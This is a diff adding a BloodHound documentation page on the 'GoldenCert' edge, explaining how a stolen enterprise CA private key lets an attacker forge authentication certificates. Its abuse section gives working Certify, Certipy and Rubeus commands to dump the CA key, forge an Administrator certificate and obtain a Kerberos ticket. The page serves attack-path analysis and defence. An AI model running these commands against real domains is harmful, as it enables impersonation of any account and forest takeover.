@@ -1,0 +1,81 @@
+---
+title: GoldenCert
+description: The victim principal has a certificate private key that can be abused to sign "golden" certificates for authentication of any enabled principal in the AD forest of the domain.
+---
+
+<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+
+The victim principal hosts the enrollment service of an enterprise CA, which implies it has the private key of the enterprise CA's certificate. This private key allows an attacker to sign certificates for authentication as any enabled principal in the AD forest of the domain, as the enterprise CA is trusted for NT authentication and chain up to a root CA.
+
+It may not be possible to obtain the certificate private key if it is protected with a Trusted Platform Module (TPM) or using a Hardware Security Module (HSM). However, it may still be possible to compromise the AD forest. Administrative access to the enterprise CA host lets an attacker publish certificate templates, approve denied enrollment requests, and more. The victim principal will have an ESC7 edge to the domain if any such attack has been found possible by BloodHound.
+
+## Abuse Info
+
+### Windows
+
+#### Step 1
+
+Obtain CA certificate incl. private key
+
+Use Certify (2.0) to export all certificates in the local machine certificate store and identify the CA certificate by the name of the CA:
+
+```cmd
+Certify.exe manage-self --dump-certs
+```
+
+#### Step 2
+
+Forge certificate and obtain a TGT as targeted principal.
+
+Forge a certificate of a target principal:
+```cmd
+Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500
+```
+
+Request a TGT for the targeted principal using the certificate with Rubeus:
+```cmd
+Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>
+```
+### Linux
+
+#### Step 1
+
+Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy, and identify the CA certificate by the name of the CA.
+```bash
+certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'
+```
+#### Step 2
+
+Forge a certificate of a target principal:
+```bash
+certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'
+```
+#### Step 3
+
+Request a TGT for the targeted principal using the certificate against a given DC:
+```bash
+ certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'
+```
+## Opsec Considerations
+
+When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate.
+
+## Edge Schema
+
+Source: [Computer](/resources/nodes/computer)  
+Destination: [Domain](/resources/nodes/domain)  
+Traversable: **Yes**  
+
+## References
+
+This edge is related to the following MITRE ATT&CK tactic and techniques:
+
+* https://attack.mitre.org/techniques/T1649/
+
+### Abuse and Opsec references
+
+* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [https://github.com/GhostPack/Certify/wiki/3-%E2%80%90-Domain-Persistence-Techniques#dpersist1---forging-certificates-with-stolen-ca-certificates](https://github.com/GhostPack/Certify/wiki/3-%E2%80%90-Domain-Persistence-Techniques#dpersist1---forging-certificates-with-stolen-ca-certificates)
+* [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)
+* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+
